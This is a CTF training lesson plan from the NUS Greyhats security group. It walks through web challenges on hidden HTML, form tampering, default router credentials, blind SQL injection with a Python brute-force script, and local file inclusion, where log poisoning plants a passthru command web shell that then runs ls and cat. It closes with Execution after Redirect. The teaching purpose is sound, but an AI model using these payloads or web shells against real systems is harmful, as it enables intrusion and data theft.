CTF 101 Web Security Lesson Plan
====================================


NUS Greyhats
------------

The NUS Greyhats is an information security special interest group in NUS. We
organise security sharing talks, workshops (like this one), and internal
discussions on novel security research and news. In addition, we also
participate in local and international information security CTF competitions.


CTF101
------

We will be employing the analogue of the Jeopardy style CTF for this workshop
to impart some basic security skills.


Assumptions
-----------

* Familiar with HTML, Javascript, MySQL, PHP


Necessary Tools
---------------


Before we begin, I'd like to do a quick check to see if everyone has the
required tools installed.

At the minimum, you should have a browser(i.e Chrome/Firefox) with the following 
extensions/add-ons to complete the practicals:

1. "Tamper data"
2. "EditThisCookie"


Accessing the CTF101 Scoreboard
-------------------------------

To access the CTF101 Scoreboard, please visit ctf.nusgreyhats.org in your
browser and sign up for an account.

I highly recommending signing up individually instead of in teams.


Flag Formats
------------

Flag formats are a very recent development within CTFs but they have grown to be
a key and crucial part of a quality one. They prevent ambiguity when solving
challenges.

In CTF101, our flag format will be flag{SomeWordsHere}. Please note that there
are exceptions to this rule in some CTFs. It will be explicitly indicated if
there are deviations to how the flag is accepted. When entering the flag into
the scoreboard always include the flag{} encapsulations.


Topics to Cover
---------------

* Getting started
	* Teaser challenges
* Security Misconfiguration
* SQL injection
* Local File Inclusion
* Broken Authentication and Session Management
	
	
Getting started
===============

Some CTF may involve simple web challenges that involve the html source code and
playing with them and we want you to know how.   


Teaser Challenges
-----------------

### Practical 1: Hidden

Can you see the hidden flag at once? If you have try highlighting the page, you 
should see a "Click me to get flag!" link. 
This is reflected in the following line of the source code:

```
<p><a href="hiddenflag.php"><font color="black">Click me to get flag!</font></a></p>
```

However, clicking the link bring you to another page "hiddenflag.php" and immediately
redirect you back to the page! If you cannot catch what the "hiddenflag.php" displayed, 
you can simply save the link to your computer and read the file. 
But it is just a fake flag :(

Now, lets go back to review the source code, there is a multiple lines of code dealing 
with table. But what are class "b" and "w" about? 
You should be able to find them in the style tag inside the header.   
 
```
<head>
    <title>CTF101 - Hidden</title>
	<style> .b {background: #000000;} .w{background: #000000;}</style>
</head>
```

Again, the background color of these two classes matched the page background color making
the table hidden. By guessing that the two classes should not refer to the same color, 
class "b" could stand for black color - #000000 and "w" could stand for white color, simply
change the background to white 

```
<head>
    <title>CTF101 - Hidden</title>
	<style> .b {background: #000000;} .w{background: #FFFFFF;}</style>
</head>
```

Then, you should be able to see a QRcode!!! 
If you cannot scan the QRcode, you can change the page background color to white.

```
<body style="margin:auto;padding-top:50px;background:black;color:#0F0;">

								TO

<body style="margin:auto;padding-top:50px;background:white;color:#0F0;">
``` 


### Practical 2: Quiz

The questions seem pretty easy right? But hold on, the submit button is disabled.... 
The first step would be to enable the button by removing the "disabled" word. 

```
<input type="submit" disabled value="Submit Quiz">
					TO
<input type="submit" value="Submit Quiz">

```

Now, you can submit the quiz. You seem to have answer all 3 questions correctly, but no flag is 
returned! Lets find out why.

By looking at the source code, you will find out that for Q1, the value for option 101 is wrong.
Simply change the value "111" to "101".

```
<option value="111">101</option>
			TO
<option value="101">101</option>	
```

Next, for Q2, there seem to be a function executing upon removing focus from the text field(onblur).
The function is running the following code:

```
<script>
	function myFunction() {
		var x = document.getElementById("q2");
		if(x.value == "lol") {x.value = "loI";}
	}
</script>
```

If your input value is "lol", the function will change it to "loI" which may seem unnoticeable in the 
browser :D Just remove the onblur method to make your input valid.

```
<input type="text" name="q2" id="q2" onblur="myFunction()"><br/><br/>
								TO
<input type="text" name="q2" id="q2"><br/><br/>
```

Now for Q3, we have the name for the input field to be "q4", by looking at how these input field name
are defined in previous questions, we could make a guess that the name should be a "q3" instead.

```
<input type="radio" name="q4" value="22">22<br>
								TO
<input type="radio" name="q3" value="22">22<br>
```

Is that all we need to do? Look closely, and there is something else! 

There is a hidden field of name "success" and the value is "false". We should change that to "true"

```
<input type="hidden" name="success" value="false">
						TO
<input type="hidden" name="success" value="true">
```

Alright, lets submit the quiz and get the flag!

You can retry using browser add-ons "Tamper data" to manipulate the post data to get flag. It will be easier =)   


Security Misconfiguration
=========================

https://www.owasp.org/index.php/Top_10_2013-A5-Security_Misconfiguration

### Practical 3: Router

You are being told to login into an admin account. If you use "admin" as the username and 
input some random password, you will only get the messsage - "Wrong username/password" which 
did not tell you whether the username is correct or wrong.

The only information visible on the page is that this login portal belong to an router - 
"D-LINK 504G ADSL ROUTER" .Lets google for the default account used in this router. 
The following information can be found on http://www.routerpasswords.com/

```
Manufacturer 	Model				Protocol	Username	Password
D-LINK			504G ADSL ROUTER	HTTP		admin		admin 
```

Using the credentials, you can login and retrieve the flag.


Broken Authentication and Session Management
============================================

https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management
//TODO: 1-3 practical


SQL Injection
=============

https://www.owasp.org/index.php/Top_10_2013-A1-Injection


### Practical 3: Blind SQL Injection
We now know what SQL Injection is, Blind SQL Injection is similar to a normal SQL Injection, the only difference is the way data is retrieved from the database.
When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. This makes
exploitation more difficult, but not impossible.

Consider this pseudocode:
```php
$query = $_GET['query'];
if (db_query($query)) {
	echo "Successful";
} else {
	echo "Fail";
}
```

When the query returns false, a "Fail" is displayed, and when the query returns true, "Successful" is displayed.
Therefore, it is harder to obtain data from the database, as the result is not output to the web page.

Now we know the idea of Blind SQL Injection, lets look at the problem on the scoreboard, and obtain the URL for this problem.

In this problem, the source code for login.php and register.php is provided.

Take a look at ```login.php```:
```php
<?php
include "config.php";
$con = mysqli_connect($MYSQL_HOST, $MYSQL_USERNAME, $MYSQL_PASSWORD, $MYSQL_DB);
$username = mysqli_real_escape_string($con, $_POST["username"]);
$password = mysqli_real_escape_string($con, $_POST["password"]);
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($con, $query);

if (mysqli_num_rows($result) === 1) {
		$row = mysqli_fetch_array($result);
		echo "<h1>Logged in!</h1>";
		echo "<p>Your flag is: $FLAG</p>";
} else {
		echo "<h1>Login failed.</h1>";
}
?>
```
From the code, you get two information:
* The username and password parameters are sanitized, and surrounded with single quotes '', this tells you that there is no way to do an SQL injection on this page.
* The ```$FLAG``` is echo'ed when you login, therefore you need to find a way to obtain the username/password.

Now, we take a look at ```register.php```:
```php
<?php
include "config.php";
$con = mysqli_connect($MYSQL_HOST, $MYSQL_USERNAME, $MYSQL_PASSWORD, $MYSQL_DB);
$username = $_POST["register"];
$query = "SELECT * FROM users WHERE username='$username'";
$result = mysqli_query($con, $query);

if (mysqli_num_rows($result) !== 0) {
	  die("Someone has already registered " . htmlspecialchars($username));
}

die("Registration has been disabled.");
?>
```

From ```register.php```, certain things should raise some red flags immediately.
* The username parameter is not being sanitized by the mysqli_real_escape_string function.

When the mysql query returns at least 1 row, the page would return "Someone has already registered...." else, it'd show that registration has been disabled.
Using this information, we are able to first look for an username that exists in the database.

The original query is ```SELECT * FROM users WHERE username ='$username'```.
To look for a username, we can make use of the SQL LIKE operator. 
Let's manipulate the query to be ```SELECT * FROM users WHERE username ='' or username LIKE 'a%'```
To get the query to be that, the $username parameter has to be ```' or username like 'a%```, note how I did not close the last single quote.

Now, the page should return ```someone has already registered...```, that means there is a username starting with "a".

Now, we do the same thing to the second character to retrieve the full username.

You should discover that the username is 'admin'.

To obtain the password for 'admin', we'll use the same technique, but on the password field.
The query should now be ```SELECT * FROM users WHERE username = 'admin' and password like '%'```.

To make things easier, we can make use of a python script to bruteforce the password.

```python
import string
import requests

load = string.digits + string.letters
url = 'http://url/register.php'
prePassword = ""
found = False
while found == False:
	found = True
	for i in load:
		payload = {'register':'admin\' and password like \''+prePassword+i+'%'}
		r = requests.post(url, data=payload)
		print("trying %s" % (prePassword+i))
		if not "disabled" in r.content:
			print r.content
			prePassword = prePassword+i
			found = False
			break
```

After running the script, you can login with the username/password and obtain the flag!


Local File Inclusion
======================
A file inclusion vulnerability is a type of vulnerability that is often found on websites. It allows an attacker to include a file , usually through a script on the webserver.
The vulnerability occurs due to the use of user-supplied input without proper validation. 

Consider this PHP example:
```php
<?php
   if ( isset( $_GET['COLOR'] ) ) {
	   include( $_GET['COLOR'] . '.php' );
   }
?>
```

In this example, making use of the COLOR parameter, an attacker is able to specify an arbitrary file to be included.
* vulnerable.php?color=<b>exploit.php</b> - Executes codes from an existing file in the server.

However, if the server was misconfigured, the vulnerability can become more critical.
PHP misconfiguration: allow_url_include=on and allow_url_fopen=on
* vulnerable.php?color=<b>http://www.nusgreyhats.org/exploit.php</b> - Injects a remotely hosted file containing malicious codes

Since PHP 5.0.0, an attacker is able to use the function PHP://filter/convert.base64-encode/resource to view the source code of any PHP file.
* vulnerable.php?color=<b>php://filter/convert.base64-encode/resource=vulnerable</b> - View the source code of vulnerable.php in base64 encoding.
With the base64 encoding of <b>vulnerable.php</b>, an attacker can decode the file and obtain the source code.

### Practical: Local File Inclusion
Please look at the problem on the scoreboard, and obtain the URL for this problem. Using the PHP filter function, view the source code of the file.

Take a look at the source of index.php:
```php
<?php
$pwhash="ffd313452dab00927cb61065a392f30ae454e70f";

if (@$_GET['log']) {
		include($_GET['log'].".log");
}
include((@$_GET['page']?$_GET['page'].".php":"main.php"));

?>
```

Now, the goal of a hacker, is to manipulate the program into running arbitrary commands that the programmer did not intend for. 
Here, we see two segments that includes files. Now, the log file would be interesting, and the next section will show you why.

Now, we take a look at ```login.php:```
```php
<?php
$login=@$_POST['login'];
$password=@$_POST['password'];
if(@$login=="admin" && sha1(@$password)==$pwhash){
	//don't bother logging in
	//try something else
}else if (@$login&&@$password&&@$_GET['debug']) {
	echo "Login error, login credentials has been saved to ./".htmlentities($login).".log";
	$logfile = "./".$login.".log";
	file_put_contents($logfile, $login."\n".$password);
}
?>
<center>
login<br/><br/>
<form action="" method="POST">
<input name="login" placeholder="login"><br/>
<input name="password" placeholder="password"><br/><br/>
<input type="submit" value="Go!">
</form>
</center>
```

From ```login.php```, we can tell that it'd be difficult to crack the ```$pwhash```. However, there is an interesting section of the code that logs login attempt to a file determined by the username provided.
Remember from ```index.php```, you are able to include log files? Got an idea of how to run arbitrary commands now?

Let's first try to use the logging function to write some PHP code into the log file, and then run it using ```index.php```.
* index.php?page=login&debug=1 - Username = nusgreyhats & Password = <?php echo "HAHA GOT YOU!"; ?></br>
Or</br>
```curl -d "login=nusgreyhats&password=<?php echo \"HAHA GOT YOU!\"?>" "http://url/index.php?page=login&debug=1"```
Remember to change the URL to the correct URL.

Now let's browse to the log file to see if it is written accurately.
* http://URL/nusgreyhats.log - You should see the PHP code you've specified being output.

Great! Now we can proceed to write PHP codes that allows use to run arbitrary commands.
Write this to the log file:
```php
<?
passthru($_GET['cmd']);
?>
```
Take a look at the PHP manual for the passthru function:
http://php.net/manual/en/function.passthru.php
What it does is to execute a command on the machine and to pass the output back to the browser.
Therefore, using passthru, we are able to enumerate directories.

Now, using the ```index.php?log=nusgreyhats``` method, let's run some arbitrary commands.

Let's first try to run a ```ls``` command.
* http://URL/index.php?log=nusgreyhats&cmd=ls - You should be able to see the contents of the current working directory.

Now, we see the flag.txt file located in the directory.

Let's ```cat``` the file to see the contents.
* http://URL/index.php?log=nusgreyhats&cmd=cat flag.txt

YAY we got the flag!

Execution after Redirect (EAR)
==============================
Execution after Redirect (EAR) is an attack where attacker can ignore redirects and try to get content not intended for the user. Let's consider the following code
```php
$current_user = get_current_user ();
if (!$current_user ->is_admin())
{
    header("Location: /");
}
echo "Sensitive Information";
```

In this example, this simple application simply check if the user is admin or not. If it is not, the user will get redirected away via "header()". Else, the page will just continue loading. 

EAR is a logic flaw that arises when a web application developer misunderstood the sematics of redirection. The typical belief is that the web application will halt its processing after the web application perform a redirection. In this above example, the common misunderstanding is that the echo "Sensitive Information" will not be executed if the user is not admin. 

This may not be true. Some framework and languages executes all the rest of the operation after the redirection operation. The browser simply perpetuates this understanding by simply obediently performing the rediredion when it saw "header". To the web developer and also normal user, it seems like the following lines after the redirection is not executed. 

However, what if you have "something" that don't obey the redirect operation? 


Credit: http://cs.ucsb.edu/~bboe/public/pubs/fear-the-ear-ccs2011.pdf
